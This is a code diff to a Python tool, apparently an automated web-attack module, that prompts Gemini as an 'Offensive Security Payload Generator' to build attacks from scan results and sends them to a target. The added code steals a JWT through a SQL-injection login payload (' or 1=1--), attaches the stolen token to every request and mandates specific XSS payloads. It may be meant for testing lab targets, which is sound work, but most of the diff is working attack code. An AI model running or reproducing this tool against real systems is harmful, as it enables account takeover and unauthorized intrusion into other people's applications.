@@ -14,6 +14,7 @@ import json
 import logging
 import requests
 import urllib3
+import time
 
 from google import genai
 from google.genai import types
@@ -29,36 +30,59 @@ log = logging.getLogger("gemini_attacker")
 
 MODEL_NAME = "gemini-2.5-flash"
 
-SYSTEM_PROMPT = """\
+SYSTEM_PROMPT = r"""
 Você é um **Offensive Security Payload Generator** especialista em Web Application Security.
 Você receberá dados brutos de reconhecimento e escaneamento do PreviSwit (endpoints, parâmetros, headers, portas).
 Sua função é gerar payloads ofensivos direcionados para testar vulnerabilidades reais no alvo.
 
 Retorne EXCLUSIVAMENTE um JSON com uma lista de ataques a serem testados.
+
+**ATENÇÃO:** O schema abaixo é apenas um TEMPLATE. Você DEVE substituir
+`{URL_COMPLETA_ENCONTRADA_NO_SCAN}`, `{METODO}`, `{PAYLOAD_OFENSIVO}`,
+`{TIPO_VULNERABILIDADE}` e `{INDICADOR_SUCESSO}` pelos valores REAIS extraídos
+do contexto de entrada (`scan_results`). NUNCA retorne os placeholders literais.
+
 Siga rigorosamente este schema:
 
 ```json
 {
   "targeted_attacks": [
     {
-      "url": "<endpoint alvo completo>",
-      "method": "GET|POST|PUT|DELETE",
+      "url": "{URL_COMPLETA_ENCONTRADA_NO_SCAN}",
+      "method": "{METODO}",
       "headers": {"Content-Type": "application/json"},
-      "data": "<payload ofensivo, ex: ' OR 1=1 --> ou json>",
+      "data": "{\"campo\": \"<iframe src=\\\"javascript:alert(`xss`)\\\">\"}" ,
       "is_json": true,
-      "vulnerability_type": "SQLi | XSS | SSRF | LFI | CMDi | etc",
-      "success_indicator": "<string esperada na resposta HTTP se o ataque funcionar, ex: syntax error>"
+      "vulnerability_type": "{TIPO_VULNERABILIDADE}",
+      "success_indicator": "{INDICADOR_SUCESSO}"
     }
   ]
 }
 ```
 
-### Regras Rigorosas:
-1. Você DEVE basear seus ataques EXCLUSIVAMENTE nos endpoints, rotas e parâmetros fornecidos no JSON de contexto (scan_results). É ESTRITAMENTE PROIBIDO inventar caminhos genéricos como /login ou /ping se eles não aparecerem nos dados.
-2. Construa `data` condizente com o método e Content-Type (ex: json para `application/json`, querystring para `application/x-www-form-urlencoded`). Use a flag `"is_json"` corretamente.
-3. O `success_indicator` deve ser o mais preciso possível para evitar falsos positivos na validação automatizada subsequente.
-4. NENHUMA EXPLICAÇÃO. NENHUM COMENTÁRIO. APENAS O JSON VÁLIDO DE RETORNO.
+### Regras Rigorosas (SIGA TODAS OU SERÁ DESCARTADO):
+1. **PROIBIDO INVENTAR ROTAS:** Você DEVE basear seus ataques EXCLUSIVAMENTE nos endpoints, rotas
+   e parâmetros fornecidos no JSON de contexto (`scan_results`). É ESTRITAMENTE PROIBIDO inventar
+   caminhos genéricos como `/login`, `/ping`, `/search`, `/comment` ou qualquer rota que NÃO
+   esteja presente nos dados fornecidos. Se uma rota não existe nos dados, NÃO a use.
+2. **FOCO EM APIs (BACKEND):** Priorize rotas de API REST (ex: `/api/...`, `/rest/...`).
+   Quando o endpoint aceitar JSON, OBRIGATORIAMENTE defina `"is_json": true` e envie
+   `"headers": {"Content-Type": "application/json"}`. Construa `data` como string JSON válida.
+3. **PAYLOADS XSS OBRIGATÓRIOS:** Para ataques XSS, utilize EXCLUSIVAMENTE um destes payloads:
+   - `<iframe src="javascript:alert(`xss`)">`
+   - `"><img src=x onerror=alert(1)>`
+   Embuta-os dentro do campo JSON do corpo da requisição (ex: `{"key": "<payload>"}`).
+4. **success_indicator PRECISO:** O `success_indicator` deve ser uma substring curta e exata
+   que apareceria na resposta HTTP se o payload fosse refletido (ex: `<iframe`, `onerror=alert`).
+   Evite indicadores genéricos.
+5. **FUZZING OBRIGATÓRIO:** Se a rota de API exigir parâmetros complexos (ex: `captchaId`,
+   `UserId`, `email`, `orderId`, `bid`), você DEVE forjar valores estruturalmente válidos
+   (ex: `captchaId: 1`, `email: "test@test.com"`, `UserId: 1`) junto com o payload de XSS
+   no campo alvo. É terminantemente PROIBIDO enviar valores nulos, vazios ou `undefined`
+   que gerem erros 500 no servidor.
+6. NENHUMA EXPLICAÇÃO. NENHUM COMENTÁRIO. APENAS O JSON VÁLIDO DE RETORNO.
 """
+
 
 
 # ─── Classe Principal ───────────────────────────────────────────────────────
@@ -88,6 +112,44 @@ class GeminiAttacker:
         except Exception as exc:
             print_status(f"Erro ao inicializar Gemini: {exc}", "ERROR")
             self.client = None
+        self.jwt_token = None
+
+    # ── Roubo de JWT via SQLi ────────────────────────────────────────────
+
+    def _get_auth_token(self, base_url: str) -> str | None:
+        """
+        Tenta roubar um JWT válido do alvo via SQL Injection no endpoint de login.
+        Retorna o token ou None se falhar.
+        """
+        login_url = f"{base_url.rstrip('/')}/rest/user/login"
+        sqli_payload = {"email": "' or 1=1--", "password": "a"}
+
+        print_status(f"Tentando roubo de JWT via SQLi em {login_url}...", "INFO")
+
+        try:
+            res = requests.post(
+                login_url,
+                json=sqli_payload,
+                timeout=10,
+                verify=False,
+            )
+            print(f"   [DEBUG] Login SQLi status: {res.status_code}")
+
+            if res.status_code == 200:
+                token = res.json().get("authentication", {}).get("token")
+                if token:
+                    print_status(f"🔑 JWT roubado com sucesso! (token: {token[:20]}...)", "SUCCESS")
+                    return token
+                else:
+                    print("   [DEBUG] Resposta 200, mas sem token no JSON.")
+            else:
+                print(f"   [DEBUG] Login SQLi falhou. Status: {res.status_code} | Body: {res.text[:150]}")
+
+        except requests.exceptions.RequestException as e:
+            print(f"   [DEBUG] Erro no roubo de JWT: {e}")
+
+        print_status("⚠ Roubo de JWT falhou. Ataques seguirão sem autenticação.", "WARN")
+        return None
 
     # ── Método principal ────────────────────────────────────────────────
 
@@ -98,6 +160,23 @@ class GeminiAttacker:
         if not self.client:
             print_status("Gemini Attacker indisponível (sem API key ou erro de init).", "ERROR")
             return {"confirmed_vulnerabilities": []}
+
+        # ── Fase 0: Extrair URL base e roubar JWT ──────────────────────
+        base_url = scan_results.get("target", "")
+        if not base_url:
+            # Tenta deduzir do primeiro finding
+            findings = scan_results.get("findings", [])
+            if findings and isinstance(findings[0], dict):
+                first_url = findings[0].get("url", "")
+                if first_url:
+                    from urllib.parse import urlparse
+                    parsed = urlparse(first_url)
+                    base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        if base_url:
+            self.jwt_token = self._get_auth_token(base_url)
+        else:
+            print_status("⚠ Não foi possível deduzir a URL base para roubo de JWT.", "WARN")
 
         # Serializa os dados para enviar como contexto
         try:
@@ -133,11 +212,27 @@ class GeminiAttacker:
                 response_mime_type="application/json",
             )
 
-            response = self.client.models.generate_content(
-                model=self.model_name,
-                contents=user_prompt,
-                config=config,
-            )
+            max_retries = 3
+            response = None
+            
+            for attempt in range(max_retries):
+                try:
+                    response = self.client.models.generate_content(
+                        model=self.model_name,
+                        contents=user_prompt,
+                        config=config,
+                    )
+                    break  # Se deu certo, sai do loop
+                except Exception as e:
+                    if attempt < max_retries - 1:
+                        sleep_time = 2 ** attempt  # Exponential backoff (1s, 2s)
+                        print_status(f"API do Gemini sobrecarregada ou indisponível. Aguardando {sleep_time}s para tentar novamente...", "WARN")
+                        time.sleep(sleep_time)
+                    else:
+                        print_status(f"Falha crítica de comunicação com a IA após {max_retries} tentativas.", "ERROR")
+                        log.exception("Falha esgotada ao chamar Gemini")
+                        return {"confirmed_vulnerabilities": []}  # Retorna vazio para não quebrar o terminal
+
 
             if not response or not response.text:
                 print_status("Gemini retornou resposta vazia.", "WARN")
@@ -163,7 +258,10 @@ class GeminiAttacker:
             for atk in attacks:
                 url = atk.get("url")
                 method = atk.get("method", "GET").upper()
-                headers = atk.get("headers", {})
+                headers = dict(atk.get("headers", {}))  # cópia para não mutar o original
+                # Injeta JWT roubado em todas as requisições
+                if self.jwt_token and "Authorization" not in headers:
+                    headers["Authorization"] = f"Bearer {self.jwt_token}"
                 data = atk.get("data")
                 is_json = atk.get("is_json", False)
                 vuln_type = atk.get("vulnerability_type", "Unknown")
@@ -215,7 +313,8 @@ class GeminiAttacker:
                         else:
                             res = requests.request(method, **req_kwargs)
 
-                    print(f"   [DEBUG] Status: {res.status_code} | Resumo: {res.text[:100].replace(chr(10), ' ').strip()}...")
+                    print(f"   [DEBUG] URL: {url}")
+                    print(f"   [DEBUG] Status: {res.status_code} | Resumo: {res.text[:150].replace(chr(10), ' ').strip()}...")
 
                     # Valida se o success_indicator existe no corpo da resposta
                     if indicator and indicator.lower() in res.text.lower():
